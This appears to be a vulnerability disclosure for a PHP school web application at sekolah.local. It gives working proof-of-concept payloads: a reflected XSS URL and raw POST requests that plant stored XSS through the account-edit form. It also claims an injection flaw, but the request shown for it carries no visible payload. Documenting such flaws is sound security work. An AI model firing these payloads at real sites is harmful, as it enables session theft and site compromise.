Backend login is at http://sekolah.local/Admin/akun.php, click Edit to http://sekolah.local/Admin/akun_edit.php?kode= where reflective xss exists
poc : http://sekolah.local/Admin/akun_edit.php?kode=%22%3E%3CScRiPt%3Ealert(1)%3C/sCrIpT%3E

![image](https://github.com/user-attachments/assets/afb44053-de08-4087-af39-ce8cfef862d2)



A foreground injection vulnerability exists at http://sekolah.local/mail.php
Inject the package and validate as follows
```
POST /Proses_Kirim.php HTTP/1.1
Host: sekolah.local
Content-Length: 70
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://sekolah.local
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://sekolah.local/mail.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=etu9r25cqa90upigbhquadf317
Connection: close

Name=111&Email=112%40sadsa.com&number=111&subject=321321&Message=23123
```
![image](https://github.com/user-attachments/assets/9145948d-6783-43a1-96fd-99dfcccc90fc)



Backend storage of xss requires logging into the backend to access http://sekolah.local/Admin/akun_edit.php?kode=hendika
Packages are issued as follows
```
POST /Admin/Proses_Edit_Akun.php HTTP/1.1
Host: sekolah.local
Content-Length: 144
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://sekolah.local
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://sekolah.local/Admin/akun_edit.php?kode=hendika
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=etu9r25cqa90upigbhquadf317
Connection: close

Username_Lama=hendika&Username_Baru=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FsCrIpT%3E&Password=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FsCrIpT%3E&Level=2
```
![image](https://github.com/user-attachments/assets/f821b040-5317-462f-8942-a5dbb6bd6d5d)
Visiting http://sekolah.local/Admin/akun.php triggers the xss screenshot below
![image](https://github.com/user-attachments/assets/d8e7fd54-06ca-4ff7-a430-0539cde7eeea)


